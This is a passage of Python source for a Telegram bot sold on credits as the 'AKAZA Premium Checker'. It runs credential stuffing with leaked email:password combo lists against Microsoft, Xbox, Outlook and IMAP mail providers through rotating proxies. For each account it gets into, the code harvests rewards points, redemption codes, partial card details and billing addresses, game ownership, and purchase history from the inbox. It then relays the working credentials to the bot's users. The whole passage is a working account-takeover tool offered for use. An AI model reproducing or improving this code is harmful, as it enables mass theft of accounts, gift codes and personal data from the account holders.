                "last4": last4_m.group(1) if last4_m else "",
                "expiry": expiry_m.group(1) if expiry_m else "",
                "billing_addr": billing_m.group(1) if billing_m else "",
                "billing_country": country_m.group(1) if country_m else "",
            }
            return {"status": "PREMIUM" if subs else "FREE", "subs": subs,
                    "balance": "$" + bal_m.group(1) if bal_m else "", **card_info}
        except: return {"status": "FREE", "subs": [], "balance": "", "card": "", "card_type": "", "last4": ""}
    # ── PROFILE (using Outlook token) ──────────────────────────────────────
    def get_profile(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
                 'User-Agent': 'Outlook-Android/2.0'}
            r = self.session.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile',
                                 headers=h, timeout=12, verify=False)
            if r.status_code == 200:
                d = r.json()
                name = d.get('displayName', '') or d.get('names', [{}])[0].get('displayName', 'N/A')
                country = (d.get('geography', {}).get('country') or
                           d.get('location', {}).get('country') or 'N/A')
                return name or 'N/A', country
        except: pass
        return 'N/A', 'N/A'
    # ── XBOX PROFILE (Gamertag, Gamerscore, Tier) ──────────────────────────
    def get_xbox_profile(self, xbox_tk):
        """Fetch Xbox Profile details using XSTS token"""
        try:
            if not xbox_tk: return {"gt": "N/A", "score": 0, "tier": "N/A"}
            h = {
                "x-xbl-contract-version": "2",
                "Authorization": f"XBL3.0 x={xbox_tk['user_hash']};{xbox_tk['token']}",
                "Accept-Language": "en-US",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            # Need to get XSTS for profile scope first? Usually xbox_token is already XSTS if produced by do_login
            # do_login returns {'token': token, 'user_hash': uh, 'raw': data}
            
            # Using the Users/Me endpoint
            r = self.session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore,AccountTier", 
                                 headers=h, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                profile = data.get('profileUsers', [{}])[0]
                settings = {s['id']: s['value'] for s in profile.get('settings', [])}
                return {
                    "gt": settings.get('Gamertag', 'N/A'),
                    "score": settings.get('Gamerscore', '0'),
                    "tier": settings.get('AccountTier', 'N/A')
                }
        except: pass
        return {"gt": "N/A", "score": 0, "tier": "N/A"}
    # ── MINECRAFT (Xbox Live → XSTS → MC API) ─────────────────────────────
    def get_minecraft_enhanced(self, xbox_tk):
        try:
            r1 = self.session.post("https://user.auth.xboxlive.com/user/authenticate",
                                   json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com",
                                                         "RpsTicket": f"d={xbox_tk}"},
                                         "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"},
                                   timeout=10, verify=False).json()
            xbl_tk = r1['Token']
            uhs    = r1['DisplayClaims']['xui'][0]['uhs']
            r2 = self.session.post("https://xsts.auth.xboxlive.com/xsts/authorize",
                                   json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_tk]},
                                         "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"},
                                   timeout=10, verify=False).json()
            if 'XErr' in str(r2): return {"owned": False}
            xsts_tk = r2['Token']
            r3 = self.session.post("https://api.minecraftservices.com/authentication/login_with_xbox",
                                   json={"identityToken": f"XBL3.0 x={uhs};{xsts_tk}"},
                                   timeout=10, verify=False).json()
            mc_tk = r3['access_token']
            r4 = self.session.get("https://api.minecraftservices.com/minecraft/profile",
                                  headers={"Authorization": f"Bearer {mc_tk}"}, timeout=10, verify=False)
            if r4.status_code == 200:
                d = r4.json()
                return {"owned": True, "username": d.get('name', '?'),
                        "uuid": d.get('id', ''),
                        "capes": [c.get('alias', '') for c in d.get('capes', []) if c.get('alias')]}
        except: pass
        return {"owned": False}
    # ── PSN FULL CAPTURE (txn-email.playstation.com exact domain) ──────────
    def check_psn(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
                 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
            # Use txn-email.playstation.com exact sender domain – NOT generic keyword
            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
                                     "Query": {"QueryString": 'from:"reply@txn-email.playstation.com" OR from:"email02.account.sony.com" "Order Number"'},
                                     "Size": 50,
                                     "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]}
            r = self.session.post("https://outlook.live.com/search/api/v2/query",
                                  json=p, headers=h, timeout=12, verify=False).json()
            rset = r['EntitySets'][0]['ResultSets'][0]
            total = rset.get('Total', 0)
            purchases, ps_plus, order_ids, total_spent = [], False, [], 0.0
            if total > 0:
                for hit in rset.get('Results', [])[:20]:
                    subj = hit.get('Subject', '')
                    prev = hit.get('Preview', '')
                    full = subj + ' ' + prev
                    # Detect PS Plus
                    if any(x in full.lower() for x in ['playstation plus', 'ps plus', 'ps+']): ps_plus = True
                    # Extract purchase title
                    for pat in [
                        r'(?:Thank you for|You(?:\'ve| have) (?:purchased|bought))\s+(.{5,70}?)(?:\.|$|\n)',
                        r'Order.*?:\s*(.{5,60}?)(?:\.|\n|$)',
                        r'Content:\s*(.{3,60}?)(?:\n|$)',
                    ]:
                        m = re.search(pat, full, re.I)
                        if m:
                            title = re.sub(r'\s+', ' ', m.group(1).strip())
                            if 5 < len(title) < 100 and title not in purchases:
                                purchases.append(title)
                            break
                    # Extract order #
                    om = re.search(r'Order\s*(?:Number|#|ID)[:\s]*([A-Z0-9]{6,20})', full, re.I)
                    if om and om.group(1) not in order_ids: order_ids.append(om.group(1))
                    # Extract price
                    pm = re.search(r'(?:Total|Amount|Charged)[:\s]*[\$€£¥]\s*([\d.,]+)', full, re.I)
                    if pm:
                        try: total_spent += float(pm.group(1).replace(',', '.'))
                        except: pass
            return {"count": int(total), "items": purchases[:8],
                    "ps_plus": ps_plus, "order_ids": order_ids[:5],
                    "total_spent": round(total_spent, 2) if total_spent > 0 else None}
        except: return {"count": 0, "items": [], "ps_plus": False, "order_ids": [], "total_spent": None}
    # ── IMAP CHECK for non-Outlook domains ─────────────────────────────────
    @staticmethod
    def imap_check(email_addr, password, keywords=None, timeout=8):
        """Try IMAP login for Gmail / Yahoo / custom domains. Returns dict or None."""
        IMAP_SERVERS = {
            'gmail.com': ('imap.gmail.com', 993),
            'googlemail.com': ('imap.gmail.com', 993),
            'yahoo.com': ('imap.mail.yahoo.com', 993),
            'yahoo.co.uk': ('imap.mail.yahoo.com', 993),
            'yahoo.co.in': ('imap.mail.yahoo.com', 993),
            'ymail.com': ('imap.mail.yahoo.com', 993),
            'aol.com': ('imap.aol.com', 993),
            'icloud.com': ('imap.mail.me.com', 993),
            'me.com': ('imap.mail.me.com', 993),
            'mac.com': ('imap.mail.me.com', 993),
            'protonmail.com': ('imap.protonmail.com', 993),
            'proton.me': ('imap.protonmail.com', 993),
            'gmx.com': ('imap.gmx.com', 993),
            'gmx.de': ('imap.gmx.net', 993),
            'web.de': ('imap.web.de', 993),
        }
        try:
            domain = email_addr.split('@')[-1].lower()
            if domain not in IMAP_SERVERS: return None
            host, port = IMAP_SERVERS[domain]
            socket.setdefaulttimeout(timeout)
            imap = imaplib.IMAP4_SSL(host, port)
            imap.login(email_addr, password)
            # Get inbox count
            imap.select('INBOX', readonly=True)
            status, msgs = imap.search(None, 'ALL')
            inbox_count = len(msgs[0].split()) if status == 'OK' and msgs[0] else 0
            # Keyword search
            kw_hits = {}
            if keywords:
                for kw in keywords[:8]:  # limit for speed
                    try:
                        term = f'TEXT "{kw}"' if not '@' in kw else f'FROM "{kw}"'
                        _, found = imap.search(None, term)
                        cnt = len(found[0].split()) if found[0] else 0
                        if cnt > 0: kw_hits[kw] = cnt
                    except: pass
            imap.logout()
            return {'status': 'hit', 'inbox': inbox_count, 'kw_hits': kw_hits, 'domain': domain}
        except imaplib.IMAP4.error:
            return {'status': 'bad'}
        except Exception:
            return None  # timeout / not supported
    # ── STEAM CHECK (hit.py) ───────────────────────────────────────────────
    def check_steam(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
                 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
                                     "Query": {"QueryString": "noreply@steampowered.com"},
                                     "Size": 10}]}
            r = self.session.post("https://outlook.live.com/search/api/v2/query",
                                  json=p, headers=h, timeout=10, verify=False).json()
            total = int(r['EntitySets'][0]['ResultSets'][0].get('Total', 0))
            return {"count": total}
        except: return {"count": 0}
    # ── SUPERCELL CHECK (hit.py) ───────────────────────────────────────────
    def check_supercell(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
                 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
                                     "Query": {"QueryString": "supercell.com OR noreply@id.supercell.com"},
                                     "Size": 20}]}
            r = self.session.post("https://outlook.live.com/search/api/v2/query",
                                  json=p, headers=h, timeout=10, verify=False).json()
            rset = r['EntitySets'][0]['ResultSets'][0]
            games = []
            if rset.get('Total', 0) > 0:
                for hit in rset.get('Results', []):
                    text = (hit.get('Subject', '') + ' ' + hit.get('Preview', '')).lower()
                    for g in ['Clash Royale', 'Clash of Clans', 'Brawl Stars', 'Hay Day', 'Boom Beach', 'Squad Busters']:
                        if g.lower() in text and g not in games: games.append(g)
            return games
        except: return []
    # ── TIKTOK CHECK (hit.py) ─────────────────────────────────────────────
    def check_tiktok(self, tk, cid):
        try:
            h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
                 'Content-Type': 'application/json', 'User-Agent': 'Outlook-Android/2.0'}
            p = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                 "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
                                     "Query": {"QueryString": "tiktok.com OR account.tiktok"},
                                     "Size": 5}]}
            r = self.session.post("https://outlook.live.com/search/api/v2/query",
                                  json=p, headers=h, timeout=10, verify=False).json()
            rset = r['EntitySets'][0]['ResultSets'][0]
            if rset.get('Total', 0) > 0:
                for hit in rset.get('Results', []):
                    pre = hit.get('Preview', '')
                    m = re.search(r'(?:Hi|Hello|Hey|Dear)\s+([A-Za-z0-9_\.\-]{3,30})', pre)
                    if m: return m.group(1).strip()
        except: pass
        return None
    # ── INBOX SCAN (Optimized: hit.py logic) ──────────────────────────────
    def scan_inbox_enhanced(self, tk, cid, u_kws=None):
        """Enhanced inbox scanning using hit.py logic and target domains"""
        res = {"total": 0, "hits": {}}
        if not tk or not cid: return res
        h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}',
             'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
        
        # 1. Total Count
        try:
            r_start = self.session.post(
                f"https://outlook.live.com/owa/{quote(cid)}/startupdata.ashx?app=Mini&n=0",
                data="", headers={**h, 'action': 'StartupData', 'x-owa-sessionid': str(uuid.uuid4()), 'content-length': '0'},
                timeout=12, verify=False)
            m_count = re.search(r'"TotalCount"\s*:\s*(\d+)', r_start.text)
            if m_count: res['total'] = int(m_count.group(1))
        except: pass
        # 2. Sequential search for better reliability
        # We check built-in domains in batches for speed, 
        # but check USER keywords individually (hit.py style) for maximum accuracy.
        
        # 2a. Built-in TARGET_DOMAINS
        domains = list(TARGET_DOMAINS.keys())
        for i in range(0, len(domains), 10):
            batch = domains[i:i+10]
            q = ' OR '.join([f'"{k}"' for k in batch])
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "EntityRequests": [{
                    "EntityType": "Conversation", "ContentSources": ["Exchange"],
                    "Query": {"QueryString": q}, "Size": 50
                }]
            }
            try:
                r = self.session.post("https://outlook.live.com/search/api/v2/query",
                                      json=payload, headers=h, timeout=12, verify=False).json()
                rset = r.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0]
                if rset.get('Total', 0) > 0:
                    for item in rset.get('Results', []):
                        frm = item.get('From', {}).get('EmailAddress', {})
                        sender = (frm.get('Address', '') + ' ' + frm.get('Name', '')).lower()
                        content = (item.get('Subject', '') + ' ' + item.get('Preview', '') + ' ' + sender).lower()
                        for k in batch:
                            if k.lower() in content:
                                name = TARGET_DOMAINS.get(k, k)
                                res['hits'][name] = res['hits'].get(name, 0) + 1
            except: pass
        # 2b. User CUSTOM Keywords (hit.py style - individual search)
        if u_kws:
            for kw in u_kws:
                q = f'"{kw}"'
                if "@" in kw or "." in kw: q = f'from:"{kw}" OR "{kw}"'
                payload = {
                    "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
                    "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": q}, "Size": 10}]
                }
                try:
                    r = self.session.post("https://outlook.live.com/search/api/v2/query",
                                          json=payload, headers=h, timeout=10, verify=False).json()
                    rset = r.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0]
                    total = rset.get('Total', 0)
                    if total > 0:
                        res['hits'][kw] = res['hits'].get(kw, 0) + total
                except: pass
        return res
    # ── MAIN CHECK ORCHESTRATOR ────────────────────────────────────────────
    async def check(self, email, password, uk=None, fast=False):
        if uk is None: uk = []
        loop = asyncio.get_running_loop()
        proxies = dict(self.session.proxies) if self.session.proxies else {}
        def make_checker():
            """Create a fresh checker with same proxy"""
            c = AkazaChecker()
            c.session.verify = False
            if proxies: c.session.proxies = proxies
            return c
        try:
            # ── STEP 1: Xbox RPS login (flux.py — primary) ──────────────
            up, ppft = await loop.run_in_executor(bot_executor, self.get_sftag_params)
            if not up:
                logger.warning(f"SFTAG failed for {email}")
                return {'status': 'error', 'email': email, 'password': password}
            status, xbox_token = await loop.run_in_executor(bot_executor, self.do_login, email, password, up, ppft)
            if status == '2FA': return {'status': '2fa', 'email': email, 'password': password}
            if status == 'BAD': return {'status': 'bad', 'email': email, 'password': password}
            xbox_ok = (status == 'TOKEN' and bool(xbox_token))
            # ── STEP 2: Outlook OAuth2 login (p7.py/hit.py — secondary) ─
            out_checker = make_checker()
            outlook_res = await loop.run_in_executor(
                bot_executor, out_checker._outlook_login, email, password)
            
            if outlook_res == ("2FA", None):
                return {'status': '2fa', 'email': email, 'password': password}
            if outlook_res == ("RETRY", None):
                return {'status': 'error', 'email': email, 'password': password}
                
            outlook_token, cid_out = outlook_res
            outlook_ok = bool(outlook_token and cid_out)
            # If neither succeeded → bad
            if not xbox_ok and not outlook_ok:
                return {'status': 'bad', 'email': email, 'password': password}
            # CID for profile/inbox: prefer outlook, fall back to xbox session cookie
            if not cid_out:
                cid_out = next((c.value.upper() for c in self.session.cookies if c.name == 'MSPCID'), '')
            # Fast mode — only rewards + codes
            if fast and xbox_ok:
                pts   = await loop.run_in_executor(bot_executor, self.get_rewards_points)
                codes = await loop.run_in_executor(bot_executor, self.get_redemption_codes)
                return {'status': 'hit', 'email': email, 'password': password,
                        'pts': pts, 'codes': codes, 'subs': {"status":"FREE","subs":[],"balance":"","card":""},
                        'name': 'N/A', 'country': 'N/A', 'mc': {"owned": False},
                        'inbox': {"total":0,"hits":{}}, 'psn': {"count":0,"items":[]},
                        'steam': {"count":0}, 'supercell': [], 'tiktok': None}
            # ── STEP 3: All captures in parallel ─────────────────────────
            async def safe_run(fn, *args):
                try: return await loop.run_in_executor(bot_executor, fn, *args)
                except: return None
            coros = []
            # Xbox captures (index 0-4)
            if xbox_ok:
                coros += [safe_run(self.get_rewards_points),
                          safe_run(self.get_redemption_codes),
                          safe_run(self.get_microsoft_subs),
                          safe_run(self.get_minecraft_enhanced, xbox_token),
                          safe_run(self.get_xbox_profile, xbox_token)]
            else:
                coros += [safe_run(lambda: 0),
                          safe_run(lambda: []),
                          safe_run(lambda: {"status":"FREE","subs":[],"balance":"","card":""}),
                          safe_run(lambda: {"owned": False}),
                          safe_run(lambda: {"gt":"N/A","score":"0","tier":"N/A"})]
            # Outlook captures (index 5-10)
            if outlook_ok:
                coros += [safe_run(out_checker.get_profile, outlook_token, cid_out),
                          safe_run(out_checker.scan_inbox_enhanced, outlook_token, cid_out, uk),
                          safe_run(out_checker.check_psn, outlook_token, cid_out),
                          safe_run(out_checker.check_steam, outlook_token, cid_out),
                          safe_run(out_checker.check_supercell, outlook_token, cid_out),
                          safe_run(out_checker.check_tiktok, outlook_token, cid_out)]
            else:
                coros += [safe_run(lambda: ('N/A','N/A')),
                          safe_run(lambda: {"total":0,"hits":{}}),
                          safe_run(lambda: {"count":0,"items":[],"ps_plus":False,"order_ids":[],"total_spent":None}),
                          safe_run(lambda: {"count":0}),
                          safe_run(lambda: []),
                          safe_run(lambda: None)]
            # IMAP capture (index 11) — non-Outlook domains
            coros += [safe_run(AkazaChecker.imap_check, email, password, uk)]
            res = await asyncio.gather(*coros, return_exceptions=True)
            def g(i, default):
                v = res[i]
                return v if not isinstance(v, Exception) and v is not None else default
            pts       = g(0, 0)
            codes     = g(1, [])
            subs      = g(2, {"status":"FREE","subs":[],"balance":"","card":"","card_type":"","last4":""})
            mc        = g(3, {"owned": False})
            xbox_prof = g(4, {"gt":"N/A","score":"0","tier":"N/A"})
            nc        = g(5, ('N/A','N/A'))
            name, country = nc if isinstance(nc, tuple) else ('N/A','N/A')
            inbox     = g(6, {"total":0,"hits":{}})
            psn       = g(7, {"count":0,"items":[],"ps_plus":False,"order_ids":[],"total_spent":None})
            steam     = g(8, {"count":0})
            supercell = g(9, [])
            tiktok    = g(10, None)
            imap_res  = g(11, None)
            return {'status': 'hit', 'email': email, 'password': password,
                    'pts': pts, 'codes': codes, 'subs': subs, 'name': name, 'country': country,
                    'mc': mc, 'xbox': xbox_prof, 'inbox': inbox, 'psn': psn, 'steam': steam,
                    'supercell': supercell, 'tiktok': tiktok, 'imap': imap_res}
        except Exception as e:
            logger.exception(f"Check error for {email}: {e}")
            return {'status': 'error', 'email': email, 'password': password}
# ============================================================================
# BOT HANDLERS
# ============================================================================
user_proxies = {}
pending_files = {}
active_sessions = set()   # UIDs currently running
stop_flags = {}           # uid -> True means kill that session
MAX_CONCURRENT = 4        # concurrent checking slots
# Queue: list of (uid, asyncio.Event) in FIFO order (free users wait here)
_session_queue: list = []
def _queue_position(uid) -> int:
    """1-based position in the waiting queue, 0 if not queued."""
    for i, (u, _) in enumerate(_session_queue):
        if u == uid: return i + 1
    return 0
async def _try_dequeue(bot):
    """Try to admit the next waiter when a slot opens."""
    global _session_queue
    while _session_queue and len(active_sessions) < MAX_CONCURRENT:
        next_uid, event = _session_queue.pop(0)
        active_sessions.add(next_uid)
        stop_flags[next_uid] = False
        event.set()   # wake that user's waiting coroutine
        try:
            await bot.send_message(next_uid, "✅ <b>Your turn!</b> Starting your session now...", parse_mode="HTML")
        except: pass
        break  # only admit one at a time; the released outer handler adds more if needed
# ─── Menu helper builders ─────────────────────────────────────────────────────
def _back_btn(): return [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
def _tier_badge(uid, credits, has_access_flag, is_mod_flag):
    if uid == ADMIN_ID: return "👑 ADMIN"
    if is_mod_flag:     return "🔧 MOD"
    if has_access_flag: return "💎 PREMIUM"
    if credits > 0:     return "🔵 ACTIVE"
    return "⚪ FREE"
async def _edit_or_reply(u, text, kbd, parse_mode="HTML"):
    markup = InlineKeyboardMarkup(kbd)
    if u.callback_query:
        try:   await u.callback_query.edit_message_text(text, reply_markup=markup, parse_mode=parse_mode)
        except: await u.callback_query.message.reply_text(text, reply_markup=markup, parse_mode=parse_mode)
    else:
        await u.message.reply_text(text, reply_markup=markup, parse_mode=parse_mode)
# ─── Menu helper builders ─────────────────────────────────────────────────────
def _back_btn(): return [[InlineKeyboardButton("🔙 Back", callback_data="back")]]

def _tier_badge(uid, credits, has_access_flag, is_mod_flag):
    if uid == ADMIN_ID: return "👑 ADMIN"
    if is_mod_flag:     return "🔧 MOD"
    if has_access_flag: return "💎 PREMIUM"
    if credits > 0:     return "🔵 ACTIVE"
    return "⚪ FREE"

async def _edit_or_reply(u, text, kbd, parse_mode="HTML"):
    markup = InlineKeyboardMarkup(kbd)
    if u.callback_query:
        try:   await u.callback_query.edit_message_text(text, reply_markup=markup, parse_mode=parse_mode)
        except: await u.callback_query.message.reply_text(text, reply_markup=markup, parse_mode=parse_mode)
    else:
        await u.message.reply_text(text, reply_markup=markup, parse_mode=parse_mode)

async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    akaza_db.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if akaza_db.is_banned(uid): return
    akaza_db.update_settings(uid, is_adding_kw=False)
    i           = akaza_db.get_user_info(uid)
    s           = akaza_db.get_user_settings(uid)
    is_mod_flag = akaza_db.is_mod(uid)
    has_acc     = bool(i.get("has_access", 0))
    badge       = _tier_badge(uid, i.get("credits", 0), has_acc, is_mod_flag)

    queue_pos  = _queue_position(uid)
    queue_line = f"\\n⏳ <b>Queue:</b> <code>#{queue_pos}</code>" if queue_pos > 0 else ""
    expiry_line = ""
    if i.get("access_expiry"):
        try:
            d = (datetime.fromisoformat(i["access_expiry"]) - datetime.now()).days
            expiry_line = f"\\n📅 <b>Access:</b> <code>{max(0, d)} days left</code>"
        except: pass

    msg = (
        f"💠 <b>AKAZA Premium Checker</b>  {badge}\\n"
        f"━━━━━━━━━━━━━━━━━━\\n"
        f"👤 <b>User:</b>     <code>{u.effective_user.first_name}</code>\\n"
        f"💰 <b>Credits:</b>  <code>{i.get('credits', 0)}</code>\\n"
        f"⚙️ <b>Threads:</b>  <code>{s['threads']}</code>  │  "
        f"⚡ <b>Fast:</b> <code>{'ON' if s['fast_mode'] else 'OFF'}</code>\\n"
        f"🔍 <b>Keywords:</b> <code>{len(s['keywords'])}</code>{expiry_line}{queue_line}\\n"
        f"━━━━━━━━━━━━━━━━━━\\n"
        f"🛡️ <i>Microsoft &amp; Gaming validator · @Akaza_isnt</i>"
    )
    kbd = [
        [InlineKeyboardButton("📊 Stats",      callback_data="stats"),
         InlineKeyboardButton("⚙️ Settings",   callback_data="settings")],
        [InlineKeyboardButton("🔍 Keywords",   callback_data="kw_menu"),
         InlineKeyboardButton("🌐 Proxy",      callback_data="proxy_menu")],
        [InlineKeyboardButton("💳 Redeem Key", callback_data="redeem_prompt"),
         InlineKeyboardButton("📖 Help",       callback_data="help")],
    ]
    if queue_pos > 0:
        kbd.append([InlineKeyboardButton(f"⏳ Queue #{queue_pos} — status", callback_data="queue_status")])
    if is_mod_flag:
        kbd.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin")])
    await _edit_or_reply(u, msg, kbd)

async def handle_text(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if akaza_db.is_banned(uid): return
    text = u.message.text or ""
    s = akaza_db.get_user_settings(uid)
    if s.get('is_adding_kw'):
        kws = text.split()
        all_kws = list(set(s['keywords'] + kws))
        akaza_db.update_settings(uid, keywords=all_kws)
        await u.message.reply_text(f"✅ Added {len(kws)} keywords. Total: {len(all_kws)}.\nUse /skw to stop.")
        return
    # Only treat as combo if it has colon AND not already being handled by handle_combo filter
    # handle_combo MessageHandler catches [^!].+:.+ so handle_text should not re-process those
async def handle_document(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if akaza_db.is_banned(uid): return
    doc = u.message.document
    if not doc or not doc.file_name.lower().endswith('.txt'): return
    file = await c.bot.get_file(doc.file_id)
    content = (await file.download_as_bytearray()).decode('utf-8', 'ignore')
    caption = (u.message.caption or "").lower()
    if 'prox' in caption:
        user_proxies[uid] = [AkazaChecker().format_proxy(l.strip()) for l in content.splitlines() if l.strip()]
        await u.message.reply_text(f"✅ Loaded {len(user_proxies[uid])} proxies.")
        return
    pending_files[uid] = content
    kbd = [[InlineKeyboardButton("📁 Combo List", callback_data="set_combo"), InlineKeyboardButton("🔌 Proxy List", callback_data="set_proxy")]]
    await u.message.reply_text(f"❓ <b>File:</b> <code>{doc.file_name}</code>\nSelect the file type:", reply_markup=InlineKeyboardMarkup(kbd), parse_mode="HTML")
async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
    uid = u.effective_user.id
    if akaza_db.is_banned(uid): return
    if not text: text = pending_files.pop(uid, "")
    lines = [l.strip() for l in text.splitlines() if ':' in l]
    if not lines: return
    user_credits = akaza_db.get_credits(uid)
    if user_credits < len(lines) and uid != ADMIN_ID:
        await (u.callback_query.message.reply_text(f"⚠️ <b>Insufficient Credits!</b>\nYou need <code>{len(lines)}</code> but have <code>{user_credits}</code>.\n🛒 Contact @Akaza_isnt to buy credits.", parse_mode="HTML") if u.callback_query else u.message.reply_text(f"⚠️ <b>Insufficient Credits!</b>\nYou need <code>{len(lines)}</code> but have <code>{user_credits}</code>.\n🛒 Contact @Akaza_isnt to buy credits.", parse_mode="HTML"))
        return
    s = akaza_db.get_user_settings(uid)
    px = user_proxies.get(uid, []) or PROXIES_LIST
    thr = min(s['threads'], 300) if px else min(s['threads'], 10)
    is_premium = akaza_db.has_access(uid)   # has_access=1 → premium
    if uid == ADMIN_ID:
        # Admin: kill everyone else immediately, take a slot
        for _uid in list(active_sessions):
            if _uid != ADMIN_ID:
                stop_flags[_uid] = True
        active_sessions.add(uid)
        stop_flags[uid] = False
    elif is_premium:
        # Premium: bypass queue, grab slot directly if available
        if len(active_sessions) >= MAX_CONCURRENT:
            await (u.callback_query.message.reply_text(
                f"⚠️ <b>Bot Busy!</b> All {MAX_CONCURRENT} slots are full.\n"
                "As a <b>Premium</b> user you bypass the queue — please retry in a moment.",
                parse_mode="HTML") if u.callback_query else u.message.reply_text(
                f"⚠️ <b>Bot Busy!</b> All {MAX_CONCURRENT} slots are full.\n"
                "As a <b>Premium</b> user you bypass the queue — please retry in a moment.",
                parse_mode="HTML"))
            return
        active_sessions.add(uid)
        stop_flags[uid] = False
    else:
        # Free user: join/check queue
        if _queue_position(uid) > 0:
            pos = _queue_position(uid)
            await (u.callback_query.message.reply_text(
                f"⏳ You are already in the queue at position <b>#{pos}</b>.", parse_mode="HTML")
                if u.callback_query else u.message.reply_text(
                f"⏳ You are already in the queue at position <b>#{pos}</b>.", parse_mode="HTML"))
            return
        if len(active_sessions) < MAX_CONCURRENT:
            # Slot is free — take it directly
            active_sessions.add(uid)
            stop_flags[uid] = False
        else:
            # Join queue and wait
            ready_event = asyncio.Event()
            _session_queue.append((uid, ready_event))
            pos = len(_session_queue)
            wait_msg = await (u.callback_query.message.reply_text(
                f"⏳ <b>Queue Position: #{pos}</b>\n"
                f"All {MAX_CONCURRENT} slots are busy. You'll be notified when your turn starts.\n"
                "<i>💎 Upgrade to Premium to bypass the queue!</i>",
                parse_mode="HTML") if u.callback_query else u.message.reply_text(
                f"⏳ <b>Queue Position: #{pos}</b>\n"
                f"All {MAX_CONCURRENT} slots are busy. You'll be notified when your turn starts.\n"
                "<i>💎 Upgrade to Premium to bypass the queue!</i>",
                parse_mode="HTML"))
            # Poll and update queue position every 15 s while waiting
            while not ready_event.is_set():
                await asyncio.sleep(15)
                if ready_event.is_set(): break
                cur_pos = _queue_position(uid)
                if cur_pos == 0: break  # removed from queue (shouldn't normally happen)
                try:
                    await wait_msg.edit_text(
                        f"⏳ <b>Queue Position: #{cur_pos}</b>\n"
                        f"Estimated wait: ~{cur_pos * 3} min. Hang tight!",
                        parse_mode="HTML")
                except: pass
            # Slot was granted by _try_dequeue; if somehow still not in active_sessions, abort
            if uid not in active_sessions:
                return
    status_msg = await (u.callback_query.message.reply_text("🚀 Starting session...") if u.callback_query else u.message.reply_text("🚀 Starting session..."))
    hits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
    all_hits_results, points_results_raw, ms_hits_results_raw, codes_results, inbox_results, psn_results = [], [], [], [], [], []
    sid = str(uuid.uuid4().hex[:6])
    sem, up_lock = asyncio.Semaphore(thr), asyncio.Lock()
    async def worker(line):
        if stop_flags.get(uid): return
        nonlocal hits, bad, tfa, err, checked, last_up, last_h
        async with sem:
            if stop_flags.get(uid): return
            try:
                parts = line.split(':', 1)
                p = random.choice(px) if px else None
                data = await AkazaChecker(p).check(parts[0].strip(), parts[1].strip(), s['keywords'], s['fast_mode'])
            except: data = {'status': 'error', 'email': line.split(':')[0]}
            checked += 1; akaza_db.use_credit(uid); akaza_db.save_result(uid, data.get('email',''), data['status'], data)
            st = data['status']
            if st == 'hit':
                hits += 1; pts = data.get('pts', 0); country = data.get('country','N/A')
                email, password = data['email'], data['password']
                xbox = data.get('xbox', {})
                mc = data.get('mc', {})
                inbox = data.get('inbox', {})
                psn = data.get('psn', {})
                steam = data.get('steam', {})
                
                tier = '💎 ULTRA' if pts >= 20000 or (mc and mc.get('owned')) else '⭐ PREMIUM' if pts >= 5000 else '🎯 HIT'
                msg = (f"<b>{tier} - AKAZA HIT</b>\n"
                       f"━━━━━━━━━━━━━━━━━━\n"
                       f"📧 <code>{email}</code>\n"
                       f"🔑 <code>{password}</code>\n\n"
                       f"👤 <b>Name:</b> <code>{data.get('name','N/A')}</code>\n"
                       f"🌍 <b>Region:</b> <code>{country}</code>\n"
                       f"⭐ <b>Rewards:</b> <code>{pts} Points</code>\n"
                       f"🎮 <b>Xbox:</b> <code>{xbox.get('gt','N/A')}</code> (Score: {xbox.get('score',0)})\n")
                all_hits_results.append(f"{email}:{password} | Pts:{pts} | GT:{xbox.get('gt','N/A')} | {country}")
